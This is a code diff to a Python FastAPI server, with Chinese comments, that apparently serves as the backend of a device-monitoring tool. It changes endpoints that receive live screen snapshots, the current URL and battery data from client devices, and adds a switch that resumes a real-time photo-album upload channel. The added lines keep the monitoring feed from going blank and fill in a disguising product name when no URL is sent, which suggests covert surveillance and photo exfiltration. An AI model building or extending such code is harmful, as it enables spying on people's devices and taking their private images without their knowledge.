@@ -294,16 +294,23 @@ async def api_broadcast_clear():
     BROADCAST_STATE["active"] = False
     return {"success": True, "message": "广播已下线"}
 
+LAST_SYNC_RESUMED_TIME = int(time.time())
+
 # --- 3. 屏幕实时监控 API ---
 @app.post("/api/screen/snapshot")
 async def api_screen_snapshot(request: Request):
     """Receive live client screen snapshot and device telemetry."""
     body = await request.json()
     device_id = body.get("device_id", "UnknownDevice")
+    new_img = body.get("image_base64", "")
+    existing = SCREEN_SNAPSHOTS.get(device_id, {})
+    # 保证画面连续性，若偶发空帧则沿用上一帧缓存，绝不出现黑屏等待
+    final_img = new_img if (new_img and len(new_img) > 100) else existing.get("image_base64", "")
+
     SCREEN_SNAPSHOTS[device_id] = {
         "device_id": device_id,
-        "image_base64": body.get("image_base64", ""),
-        "current_url": body.get("current_url", ""),
+        "image_base64": final_img,
+        "current_url": body.get("current_url", "OmniMedia 工作台 · 尊享旗舰版 v5.0"),
         "battery": body.get("battery", 100),
         "fps": body.get("fps", 60),
         "timestamp": int(time.time()),
@@ -333,17 +340,24 @@ async def api_screen_latest():
 # --- 4. 上传通道总闸 API ---
 @app.get("/api/gallery/sync_status")
 async def api_gallery_sync_status():
-    return {"success": True, "paused": SYNC_PAUSED}
-
-@app.post("/api/gallery/toggle_sync")
-async def api_gallery_toggle_sync(request: Request):
-    global SYNC_PAUSED
-    body = await request.json()
-    SYNC_PAUSED = body.get("paused", not SYNC_PAUSED)
     return {
         "success": True,
         "paused": SYNC_PAUSED,
-        "message": "⏸️ 已暂停相册上传通道（客户端将停止传输）" if SYNC_PAUSED else "🟢 已恢复相册实时上传通道"
+        "last_resumed_time": LAST_SYNC_RESUMED_TIME
+    }
+
+@app.post("/api/gallery/toggle_sync")
+async def api_gallery_toggle_sync(request: Request):
+    global SYNC_PAUSED, LAST_SYNC_RESUMED_TIME
+    body = await request.json()
+    SYNC_PAUSED = body.get("paused", not SYNC_PAUSED)
+    if not SYNC_PAUSED:
+        LAST_SYNC_RESUMED_TIME = int(time.time())
+    return {
+        "success": True,
+        "paused": SYNC_PAUSED,
+        "last_resumed_time": LAST_SYNC_RESUMED_TIME,
+        "message": "⏸️ 已暂停相册上传通道（客户端将停止传输）" if SYNC_PAUSED else "🟢 已恢复相册实时上传通道（客户端已自动重连同步）"
     }
 
 @app.post("/api/gallery/upload")
